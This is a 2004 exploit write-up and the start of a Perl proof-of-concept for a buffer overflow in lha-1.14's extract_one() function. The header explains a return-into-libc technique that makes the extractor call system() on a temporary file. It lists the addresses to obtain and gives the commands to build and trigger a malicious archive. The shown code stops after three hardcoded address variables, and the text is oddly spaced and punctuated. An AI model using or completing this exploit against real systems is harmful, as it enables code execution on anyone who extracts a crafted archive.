These issues are triggered in the 'extract_one (  ) ' and are due to a failure of the application to properly validate string lengths in offending files. ， //These issues might allow an attacker to execute code in the context of a user invoking the affected utility. ， //Exploiting lha-1.14 ( after security advisories )  ， //19 May , 2004 ， //Copyright ( 2004 ) Lukasz Wojtow <lw @ wszia.edu.pl> ， //At the time of writing this text , some vulnerabilities have been discovered ， //and fixed , but not all ( i've sent info to major linux distributions and ， //Bugtraq , but they didn't seem to bother ) . ， //This code creates an archive , which decompressed with lha-1.14 ， //will cause a buffer overflow. The bug is in function extract_one ( there are a ， //lot of bugs , actually ) . At first it looked like like a typical stack overflow ,  ， //but after a couple of thoughts it was obvious that returnig on the stack was ， //impossible ( due to special 0xff handling ) . The only option came to my mind ， //was return-into-libc. ， //Addresses inside this code do system ( \"/tmp/lhXXXXXX\" ) and exit (  ) . ， //Before exploiting 3 addresses have to be obtained :  ， //- system function ,  ， //- exit function ( not really needed , but SEGFAULT could be noticed )  ,  ， //- address of /tmp/lhXXXXXX inside exploitet binary. ， //Put these addresses into their place in the code ( in little endian order ， //on x86 ) and run :  ， //./code > archive.lhz ， //then command ， //lha -e archive.lhz ， //will cause execution of /tmp/lhXXXXXX ， //Enjoy ， //-CODE START- ，  #  ! /usr/bin/perl ， my $ exit_addr= \"\\x50\\xf2\\x4\\x40\" ;  ， my $ system_addr= \"\\x30\\x65\\x6\\x40\" ;  ， my $ tmp_string= \"\\xfa\\x1e\\x5\\x8\" ; ",
